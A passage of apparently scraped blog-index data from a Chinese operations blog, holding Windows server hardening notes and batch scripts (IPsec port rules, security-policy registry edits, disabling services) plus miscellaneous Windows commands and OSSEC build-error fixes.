windows2003可以停止服务，但是2008下只能关闭，不能停止服务 echo 确认之后按任意键继续 pause :menu cls echo 1 公网服务器基本配置(基本端口) echo 2 亚马逊内网网段信任(172.31.0.0/16) echo 3 lefux机房内部服务器基本配置 echo 4 邮件服务器 echo 5 VPN服务器 echo 6 DNS服务器 echo 7 添加本机IP段 echo 8 FTP对外规则 echo 10 激活策略 echo q 退出 set /p convert=请选择 if \"%CONVERT%\"==\"1\" goto a if \"%CONVERT%\"==\"2\" goto b if \"%CONVERT%\"==\"3\" goto c if \"%CONVERT%\"==\"4\" goto d if \"%CONVERT%\"==\"5\" goto e if \"%CONVERT%\"==\"6\" goto f if \"%CONVERT%\"==\"7\" goto g if \"%CONVERT%\"==\"8\" goto h if \"%CONVERT%\"==\"10\" goto i if \"%CONVERT%\"==\"q\" goto ext echo 亲，你的选择无效，你只能选择1-10 或者 q才可以哟，再试试吧！ ping -n 5 127.0.0.1 \u003e null echo. goto menu :a echo 服务器IP策略基本配置 :: 建立一个名字叫“我的规则”的安全策略先 netsh ipsec static add policy name=我的规则 :: 建立2条操作动作 netsh ipsec static add filteraction name=Permit action=permit netsh ipsec static add filteraction name=Block action=block ::对外端口访问规则 netsh ipsec static add filterlist name=80port description=\"与其他服务器80端口的交互\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=80 protocol=TCP description=\"允许其他服务器访问本机80端口\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=443 protocol=TCP description=\"允许其他服务器访问本机443端口\" ::允许本机访问其他服务器特定的端口，如果没有这条就只能访问信任IP netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=80 protocol=TCP description=\"允许本机访问其他服务器80\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=443 protocol=TCP description=\"允许本机访问其他服务器443端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=TCP description=\"允许本机访问其他服务器DNS端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=UDP description=\"允许本机访问其他服务器DNS端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any protocol=ICMP description=\"允许本机ping其他服务器\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=25 protocol=TCP description=\"允许本机访问其他服务器25\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=110 protocol=TCP description=\"允许本机访问其他服务器的110端口，110端口是为POP3（邮件协议3）服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=143 protocol=TCP description=\"允许本机访问其他服务器143端口，143端口主要是用于IMAP）\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=465 protocol=TCP description=\"允许本机访问其他服务器465端口，465端口是为SMTPS(SMTP-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=995 protocol=TCP description=\"允许本机访问其他服务器995端口，995端口是为POP3S(POP3-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=993 protocol=TCP description=\"允许本机访问其他服务器993端口，993端口是为IMAPS(IMAP-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=UDP description=\"windows时间更新\" ::netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=TCP description=\"windows时间更新\" netsh ipsec static add rule name=80port policy=我的规则 filterlist=80port filteraction=Permit :: 建立信任IP规则 netsh ipsec static add filterlist name=AllowIP description=\"信任IP\" :: ############### 此处添加 远程信任的访问IP ############### ::公司网络出口ip :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx srcmask=255.255.255.255 dstaddr=me description=\"公司网络出口ip\" ::-----------------------------------其他外网服务器------------------------- ::VPN服务器 :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx dstaddr=me description=\"中转服务器\" netsh ipsec static add rule name=AllowIP policy=我的规则 filterlist=AllowIP filteraction=Permit :: 建立一条拒绝所有IP访问规则 netsh ipsec static add filterlist name=DenyIP description=\"拒绝所有IP\" ::拒绝所有IP地址访问本机--进限制 netsh ipsec static add filter filterlist=DenyIP srcaddr=any dstaddr=me description=\"拒绝所有IP访问\" ::拒绝本机访问其他IP---出限制 ::netsh ipsec static add filter filterlist=DenyIP srcaddr=me dstadd","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/:2:0","tags":["bat","ipsec","windows","scripts"],"title":"windows 本地安全策略设置","uri":"/posts/scripts/bat/ipsec/"},{"categories":["windows","运维记事"],"content":"安装优化","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1. 系统安全 显示电脑图标到桌面: rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0 开始文件夹: shell:startup 本地安全策略: secpol.msc 计算机管理: compmgmt.msc ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:1:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.1. 修改服务器名：按项目取名。 右键点击我的电脑-高级-计算机名-更改。英文: my computer - proterties - Advanced system settings - Computer Name - Change ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:2:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.2. 调整性能设置： 右键点击我的电脑-高级-性能中，选中“设置为最佳性能”英文: my computer - proterties-Advanced - Performance-setting -Visual Effects (Adjust for best performance)； 数据执行保护设置为“只为关键的windows程序保护”。 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:3:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.3. 允许 dump file 的产生： 右键点击我的电脑-高级-启动和故障恢复-写入调试信息 设置成“最小化记录模式”。英文版操作：右击 My Computer-Advanced-Startup and recovery-write debugging infomation设置成“small…”。 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:4:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.4. 禁用 NETBOIS: 网络连接属性-tcpip 属性-高级-wins-NetBios 设置 “禁用 Tcp/ip 上的 NetBios”选项 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:5:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.5. 禁止设置网卡为 Disable 运行gpedit.msc- 用户配置-管理模板-网络-网络连接下的\"启用/禁用 LAN 链接的能力(Ability to Enable/Disable a LAN connection)“设置为Disabled 设置\"为管理员启用windows2000网路连接设置(Enable Windows2000 Network Connections settings for Administrators)” 选项为Enabled ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:6:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1.6. IIS 安装后修改站点日志目录 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:7:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"2. 用户安全 netplwiz用户名修改,安全策略里面也有设置方法 禁用Guest账号(设置复杂密码) 限制不必要的用户(如aspnet,sqldebugger等) 把系统Administrator账号改名 创建名称为Administrator陷阱用户 (正确设置描述信息,不给任何权限) 建立一个备用管理员帐户。 不让系统显示上次登录的用户名(后面本地策略中有) 通过reg脚本设置开机前 5 分钟自动登录 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:8:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"3. 本地安全策略设置 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:9:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"3.1. 本地安全策略设置 gpedit.msc-计算机配置-windows设置-安全设置 本地策略-审核策略 推荐的要审核的项目是： 策略更改 成功 失败 登录事件 成功 失败 对象访问 失败 过程追踪 无 目录服务访问 失败 特权使用 失败 系统事件 成功 失败 账户登录事件 成功 失败 账户管理 无 英文版： Audit account logon events Success,Failure Audit account management No auditing Audit directory service access Failure Audit logon event Success,Failure Audit object access Failure Audit polic change Success,Failure Audit privilege use Failure Audit process tracking No auditing Audit system events Success,Failure 本地策略—\u003e用户权限分配 关闭系统(shut down the system)： 只有Administrators组、其它全部删除。 通过终端服务允许登陆(Allow log on through Terminal services)： 只加入Administrators,Remote Desktop Users组，其他全部删除。 C、本地策略——\u003e安全选项 交互式登陆：不显示上次的用户名　启用 网络访问：不允许SAM帐户和共享的匿名枚举　启用 网络访问：不允许为网络身份验证储存凭证　启用 网络访问：可匿名访问的共享　全部删除 网络访问：可匿名访问的命名管道　全部删除 网络访问：可远程访问的注册表路径　全部删除 网络访问：可远程访问的注册表路径和子路径　全部删除 帐户：重命名系统管理员帐户　重命名一个帐户（比如administrator改成lefux,不一定是lefux问清楚再改，改后最好重启一下服务器） 英文版本： Interactive logon: Do not display last user name Enabled Network access: Do not allow anonymous enumeration of SAM accounts and share Enabled Network access: Do not allow storage of passwords and credentials for network authentication Enabled Network access: Named Pipes that can be accessed anonymously 全删除 Network access: Remotely accessible registry paths 全删除 Network access: Remotely accessible registry paths and subpaths 全删除 Network access: Shares that can be accessed anonymously 全删除 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:10:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"4. 禁用以下的服务 Computer Browser；Portable Media Serial Number Service Distributed File System; Windows Audio; Alert Distributed linktracking client： Error reporting service： FTP Publishing Service Messenger Indexing Service Microsoft Serch： NT LM Security support provide： server PrintSpooler： Remote Desktop Help Session Manager： Remote Registry; Routing and Remote Access Workstation (美国服务器不要关) 经测试可以关闭的其他服务也可以关 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:11:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"命令收集","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"1. windows 服务安装卸载 :: 注意空格 sc create \"Memcached_11233\" start= auto binPath= \"D:\\box\\memcached\\memcached.exe -d runservice -m 128 -c 512 -p 11233 -l 127.0.0.1\" DisplayName= \"Memcached_11233\" ---- sc delete Memcached_11233 ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:1:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"2. 删除windows\\temp 5天前以sess*开头的文件 forfiles /p \"C:\\Windows\\Temp\" /s /d -5 /m sess* /c \"cmd /c del /f /q /s @path\" ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:2:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"3. windows 端口转发 :: 转发不生效需先安装 ipv6 C:\\\u003e netsh interface ipv6 install :: 转发本机ip端口 到其他服务器ip端口 :: netsh interface portproxy add v4tov4 listenaddress=[外网IP] listenport=[外网端口] connectaddress=[内网IP] connectport=[内网端口] C:\\\u003e netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=10055 connectaddress=10.42.0.58 connectport=10050 :: 查看已设置的转发 C:\\\u003e netsh interface portproxy show all :: 删除端口转发 :: netsh interface portproxy delete v4tov4 listenaddress=[外网IP] listenport=[外网端口] C:\\\u003e netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=10055 ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:3:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"4. 修改ntp同步频率 regedit: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\\SpecialPollInterval 900=15分钟 3600=1小时 默认: 604800是由7(天)×24(时)×60(分)×60(秒) ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:4:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"5. windows mysql 备份 @echo off title mysql-client set \"Ymd=%date:~,4%%date:~5,2%%date:~8,2%\" echo %Ymd% C: \"D:\\xx\\mysqldump.exe\" -h\u003cip\u003e -P\u003cport\u003e -u\u003cuser\u003e -p\u003cpasswrod\u003e -R \u003c数据库名称\u003e \u003e D:\\DatabaseBak\\xxx_%Ymd%.sql ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:5:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"6. 查看80端口连接数 netstat -an -p tcp | find /c \"80\" ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:6:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"7. windows 时间获取方式 :: 编码格式 ANSI :: 脚本创建时最好选择ANSI编码(防止中文乱码) :: @echo off 表示不回显执行的命令 @echo off @echo =========Windows的原本日期时间格式======================= :: 设置变量，使用变量时需要用一对%包起来 set ORIGINAL_DATE=%date% echo %ORIGINAL_DATE% @echo =========日期按照YYYY-MM-DD格式显示====================== :: 日期截取遵从格式 %date:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 年份从第0位开始截取4位，月份从第5位开始截取2位，日期从第8位开始截取2位 set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% set CURRENT_DATE=%YEAR%-%MONTH%-%DAY% echo %CURRENT_DATE% @echo =========时间按照HH:MM:SS格式显示======================== :: 时间截取遵从格式 %time:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 时钟从第0位开始截取2位，分钟从第3位开始截取2位，秒钟从第6位开始截取2位 set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: 当时钟小于等于9时,前面有个空格，这时我们少截取一位，从第1位开始截取 set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: 处理时钟是个位数的时候前面补上一个0, LEQ表示小于等于https://www.coder.work/article/6503907 if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_TIME=%HOUR%:%MINUTE%:%SECOND% echo %CURRENT_TIME% @echo =========日期时间按照YYYY-MM-DD HH:MM:SS格式显示========= set CURRENT_DATE_TIME=%YEAR%-%MONTH%-%DAY% %HOUR%:%MINUTE%:%SECOND% echo %CURRENT_DATE_TIME% @echo =========日期时间按照YYYYMMDD_HHMMSS格式显示============= set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%_%HOUR%%MINUTE%%SECOND% echo %CURRENT_DATE_TIME_STAMP% @echo ========================================================= pause ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:7:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"8. 按照时间创建文件夹 :: 编码格式 ANSI :: 脚本创建时最好选择ANSI编码(防止中文乱码) :: @echo off 表示不回显执行的命令 @echo off :: 日期截取遵从格式 %date:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 年份从第0位开始截取4位，月份从第5位开始截取2位，日期从第8位开始截取2位 set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% :: 时间截取遵从格式 %time:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 时钟从第0位开始截取2位，分钟从第3位开始截取2位，秒钟从第6位开始截取2位 set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: 毫秒 set MILLISECIOND=%time:~9,2% :: 当时钟小于等于9时,前面有个空格，这时我们少截取一位，从第1位开始截取 set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: 处理时钟是个位数的时候前面补上一个0, LEQ表示小于等于 if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%%HOUR%%MINUTE%%SECOND%%MILLISECIOND% mkdir %CURRENT_DATE_TIME_STAMP% ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:8:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"9. windows前台程序运行到后台 ' 运行到后台 ' start.vbs Set ws = CreateObject(\"Wscript.Shell\") ws.run \"example.exe\",vbhide ' ' 程序关闭 ' stop.vbs Dim Wsh Set Wsh = WScript.CreateObject(\"WScript.Shell\") Wsh.Run \"taskkill /f /im example.exe\",0 Set Wsh=NoThing WScript.quit ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:9:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["那些年的收藏"],"content":"本地安全策略","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/","tags":["bat","windows","scripts","优化"],"title":"本地安全策略-安全选项","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["那些年的收藏"],"content":" ::本地安全策略--安全选项---需重启生效 ::安全选项 ::网络访问：可远程访问的注册表路径　reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedPaths\" /v Machine /t REG_MULTI_SZ /f ::网络访问：可远程访问的注册表路径和子路径 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedExactPaths\" /v Machine /t REG_MULTI_SZ /f ::网络访问：可匿名访问的共享 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionShares /t REG_MULTI_SZ /f ::网络访问：可匿名访问的命名管道 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionPipes /t REG_MULTI_SZ /f ::网络访问：不允许SAM帐户和共享的匿名枚举　reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa” /v restrictanonymous /t REG_DWORD /d 1 /f ::网络访问：不允许为网络身份验证储存凭证或.net passports reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"disabledomaincreds\" /t reg_dword /d 1 /f ::交互式登陆：不显示上次的用户名 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"dontdisplaylastusername\" /t reg_dword /d 1 /f ::交互式登陆：会话锁定时显示用户信息 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"legalnoticetext\" /t reg_sz /d 不显示用户信息 /f ::重命名来宾用户 ::wmic useraccountame='guest' call Rename xxxgudsadsest net user guest /active:no wmic useraccount where name='guest' call Rename xxxgudsadsest ::禁用aspnet用户 net user aspnet /active:no ::删除不安全组件 regsvr32 /u wshom.ocx regsvr32 /u shell32.dll reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sDate /t REG_SZ /d - /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sShortDate /t REG_SZ /d yyyy-MM-dd /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTime /t REG_SZ /d : /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTimeFormat /t REG_SZ /d H:mm:ss /f ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/:0:0","tags":["bat","windows","scripts","优化"],"title":"本地安全策略-安全选项","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["那些年的收藏"],"content":"关闭短文建生成注册","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/","tags":["bat","windows","scripts"],"title":"关闭短文建生成注册","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["那些年的收藏"],"content":" Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\FileSystem] \"NtfsDisable8dot3NameCreation\"=dword:00000001 ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/:0:0","tags":["bat","windows","scripts"],"title":"关闭短文建生成注册","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["那些年的收藏"],"content":"禁止windows服务","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/","tags":["bat","windows","scripts"],"title":"禁止windows服务","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["那些年的收藏"],"content":" @echo off color 0A title ############ 禁用并停止系统服务 ############### echo ############ start 禁用并停止系统服务 ############### pause echo 正在禁用Computer Browser服务 net stop Browser sc config Browser start= disabled echo 正在禁用Distributed File System服务 net stop Dfs sc config Dfs start= disalbed echo 正在禁用Distributed File System服务 net stop Dfs sc config Dfs start= disabled echo 正在禁用Distributed linktracking client服务 net stop TrkWks sc config TrkWks start= disabled echo 正在禁用Error reporting service服务 net stop ERSvc sc config ERSvc start= disabled echo 正在禁用Messenger 服务 net stop Messenger sc config Messenger start= disabled echo 正在禁用Windows Audio服务 net stop AudioSrv sc config AudioSrv start= disabled echo 正在禁用Alerter服务 net stop Alerter sc config Alerter start= disabled echo 正在禁用Help and Support 服务 net stop helpsvc sc config helpsvc= disabled echo 正在禁用Indexing Service 服务 net stop CiSvc sc config CiSvc start= disabled echo 正在禁用FTP Publishing Service服务 net stop MSFtpsvc sc config MSFtpsvc start= disabled echo 正在禁用Microsoft Serch服务 net stop MSSEARCH sc config MSSEARCH start= disabled echo 正在禁用NT LM Security support provide服务 net stop NtLmSsp sc config NtLmSsp start= disabled echo 正在禁用Portable Media Serial Number Service服务 net stop WmdmPmSN sc config WmdmPmSN start= disabled echo 正在禁用Print Spooler服务 net stop Spooler sc config Spooler start= disabled echo 正在禁用Remote Desktop Help Session Manager服务 net stop RDSessMgr sc config RDSessMgr start= disabled echo 正在禁用Remote Registry服务 net stop RemoteRegistry sc config RemoteRegistry start= disabled echo 正在禁用server服务 net stop lanmanserver sc config lanmanserver start= disabled pause echo 下面将禁用Workstation服务,美国服务器请选择N,国内选择Y echo 正在禁用Workstation服务 net stop lanmanworkstation sc config lanmanworkstation start= disabled echo 正在禁用Routing and Remote Access服务 net stop RemoteAccess sc config RemoteAccess start= disabled echo 正在禁用Help and Support服务 net stop helpsvc sc config helpsvc start= disabled echo 正在禁用FTP Publishing Service服务 net stop MSFTPSVC sc config MSFTPSVC start= disabled echo 正在禁用SNMP Service服务 net stop SNMP sc config SNMP= disabled echo 禁用coldfusion9相关服务 echo 正在禁用ColdFusion 9 .NET Service服务 net stop \"ColdFusion 9 .NET Service\" sc config \"ColdFusion 9 .NET Service\" start= disabled echo 正在禁用ColdFusion 9 ODBC Agent服务 net stop \"ColdFusion 9 ODBC Agent\" sc config \"ColdFusion 9 ODBC Agent\" start= disabled echo 正在禁用\"ColdFusion 9 ODBC Server\"服务 net stop \"ColdFusion 9 ODBC Server\" sc config \"ColdFusion 9 ODBC Server\" start= disabled echo 正在禁用ColdFusion 9 Solr Service服务 net stop CF9solr sc config CF9solr start= disabled echo 正在禁用ColdFusion 9 Search Server服务 net stop \"ColdFusion 9 Search Server\" sc config \"ColdFusion 9 Search Server\" start= disabled echo 禁用sql2008相关服务 echo 正在禁用SQL Server Integration Services 10.0服务 net stop MsDtsServer100 sc config MsDtsServer100 start= disabled echo 正在禁用SQL Active Directory Helper Service服务 net stop MSSQLServerADHelper100 sc config MSSQLServerADHelper100 start= disabled echo 正在禁用SQL Server Browser服务 net stop SQLBrowser sc config SQLBrowser start= disabled echo 正在禁用SQL Server VSS Writer服务 net stop SQLWriter sc config SQLWriter start= disabled ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/:0:0","tags":["bat","windows","scripts"],"title":"禁止windows服务","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","运维记事"],"content":"那些编译时出现的杂七杂八故障","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"1. ossec 3.3.0 编译故障 及服务端启动故障 ## 全部依赖 yum install zlib-devel pcre2-devel make gcc sqlite-devel openssl-devel libevent-devel systemd-devel ## 下载 https://ftp.pcre.org/pub/pcre/pcre2-10.32.tar.gz 解压到 src/external 中 或者安装 pcre2-devel ## 另 编译需要依赖 openssl-devel 等额外包 Makefile:766: recipe for target 'external/pcre2-10.32/install/lib/libpcre2-8.a' failed make: *** [external/pcre2-10.32/install/lib/libpcre2-8.a] Error 2 # server mysql 故障（ossec.conf配置myslq相关参数后无效） ossec-dbd(5207): ERROR: OSSEC not compiled with support for 'mysql'. ossec-dbd(1202): ERROR: Configuration error at '/data/software/ossec-server/etc/ossec.conf'. Exiting. # 安装前需要启用mysql支持（实验版本: 3.6） export DATABASE=mysql export TARGET=server export USE_GEOIP=1 # client-agent/start_agent.c:15:19: fatal error: event.h: No such file or directory # 需要安装 yum install -y libevent-devel 